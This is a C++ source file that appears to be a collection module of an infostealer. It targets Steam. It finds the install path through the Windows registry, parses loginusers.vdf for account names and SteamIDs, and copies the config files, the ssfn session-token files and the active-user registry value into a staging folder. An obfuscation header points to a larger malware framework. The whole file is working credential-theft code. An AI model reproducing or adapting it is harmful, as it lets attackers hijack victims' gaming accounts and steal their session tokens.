// Steam: loginusers.vdf, config.vdf, ssfn files, registry data.
#include "../modules.h"
#include "../config.h"
#include "../core/obf.h"
#include "../core/sys.h"
#include <windows.h>
#include <regex>
#include <sstream>

namespace {

std::string steam_path() {
    // registry first
    wchar_t buf[512] = {};
    DWORD sz = sizeof(buf), type = 0;
    HKEY k = nullptr;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Valve\\Steam", 0, KEY_READ, &k) == ERROR_SUCCESS) {
        if (RegQueryValueExW(k, L"SteamPath", nullptr, &type, (LPBYTE)buf, &sz) == ERROR_SUCCESS) {
            RegCloseKey(k);
            return util::narrow(buf);
        }
        RegCloseKey(k);
    }
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\WOW6432Node\\Valve\\Steam", 0, KEY_READ, &k) == ERROR_SUCCESS) {
        sz = sizeof(buf);
        if (RegQueryValueExW(k, L"InstallPath", nullptr, &type, (LPBYTE)buf, &sz) == ERROR_SUCCESS) {
            RegCloseKey(k);
            return util::narrow(buf);
        }
        RegCloseKey(k);
    }
    for (auto& p : { std::string("C:\\Program Files (x86)\\Steam"), std::string("C:\\Program Files\\Steam") })
        if (util::is_dir(p)) return p;
    return "";
}

// parse loginusers.vdf into readable lines (accounts + names + timestamps)
std::string parse_loginusers(const std::string& vdf) {
    std::ostringstream ss;
    // matches "76561198XXXX" { ... } blocks with their key/value pairs
    std::regex acct(R"rex("(7656\d{13})")rex");
    std::regex personalkey(R"rex("PersonaName"\s+"(.*?)")rex");
    std::regex accountkey(R"rex("AccountName"\s+"(.*?)")rex");
    std::regex lastlogin(R"rex("Timestamp"\s+"(\d+)")rex");
    auto a_begin = std::sregex_iterator(vdf.begin(), vdf.end(), acct);
    for (auto it = a_begin; it != std::sregex_iterator(); ++it) {
        ss << "steamid64: " << (*it)[1].str() << "\r\n";
    }
    for (auto it = std::sregex_iterator(vdf.begin(), vdf.end(), personalkey); it != std::sregex_iterator(); ++it)
        ss << "persona: " << (*it)[1].str() << "\r\n";
    for (auto it = std::sregex_iterator(vdf.begin(), vdf.end(), accountkey); it != std::sregex_iterator(); ++it)
        ss << "login: " << (*it)[1].str() << "\r\n";
    for (auto it = std::sregex_iterator(vdf.begin(), vdf.end(), lastlogin); it != std::sregex_iterator(); ++it)
        ss << "last_login_epoch: " << (*it)[1].str() << "\r\n";
    return ss.str();
}

} // namespace

namespace mod {

void steam(const std::string& staging) {
    std::string sp = steam_path();
    if (sp.empty()) { stage::note("steam", "not installed"); return; }

    std::string cfg_dir = util::join(sp, "config");
    std::string out_dir = util::join(staging, "steam");

    // account metadata
    std::vector<uint8_t> data;
    if (util::read_file(util::join(cfg_dir, "loginusers.vdf"), data)) {
        std::string vdf(data.begin(), data.end());
        stage::stage_text("steam", "loginusers.txt", parse_loginusers(vdf));
        stage::stage_copy("steam", util::join(cfg_dir, "loginusers.vdf"));
    }
    if (util::read_file(util::join(cfg_dir, "config.vdf"), data))
        stage::stage_copy("steam", util::join(cfg_dir, "config.vdf"));

    // ssfn* grant token files + registry
    for (auto& f : util::list_dir(sp)) {
        std::string fn = util::to_lower(util::filename_of(f));
        if (util::starts_with(fn, "ssfn")) {
            std::vector<uint8_t> ssfn;
            if (util::read_file(f, ssfn)) stage::stage_bytes("steam", util::filename_of(f), ssfn);
        }
    }
    wchar_t active[64] = {};
    DWORD sz = sizeof(active), type = 0;
    HKEY k = nullptr;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Valve\\Steam\\ActiveProcess", 0, KEY_READ, &k) == ERROR_SUCCESS) {
        if (RegQueryValueExW(k, L"ActiveUser", nullptr, &type, (LPBYTE)active, &sz) == ERROR_SUCCESS)
            stage::note("steam", "active user: " + util::narrow(active));
        RegCloseKey(k);
    }

    // whole config dir capped (includes library cache, shortcuts)
    util::copy_dir_recursive(cfg_dir, util::join(out_dir, "config"), {}, 16 * 1024 * 1024);
    stage::note("steam", "collected from " + sp);
}

} // namespace mod
